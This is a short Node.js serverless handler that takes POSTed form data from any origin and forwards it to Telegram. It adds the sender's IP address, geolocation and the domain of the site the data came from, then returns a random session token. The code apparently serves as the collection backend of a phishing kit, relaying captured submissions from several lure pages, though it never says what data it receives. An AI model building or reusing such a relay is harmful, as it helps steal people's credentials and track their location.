const crypto = require('crypto');
const { setSecurityHeaders } = require('./config');
const { parseRequestBody, getIPInfo } = require('./utils');
const { buildMessage, sendTelegram } = require('./telegram');

module.exports = async function handler(req, res) {
    const origin = req.headers.origin || '';
    setSecurityHeaders(res, origin);

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
        const data = parseRequestBody(req.body);

        if (!data) {
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const location = await getIPInfo(ip);
        const source = origin ? origin.replace(/^https?:\/\//, '').split('/')[0] : 'Unknown';
        
        const payload = {
            ...data,
            location,
            source
        };

        const msg = buildMessage(payload, ip);
        const sentSuccess = await sendTelegram(msg);

        if (sentSuccess) {
            return res.status(200).json({ success: true, session_id: crypto.randomBytes(16).toString('hex') });
        } else {
            return res.status(500).json({ success: false, error: 'Internal processing error' });
        }

    } catch (error) {
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};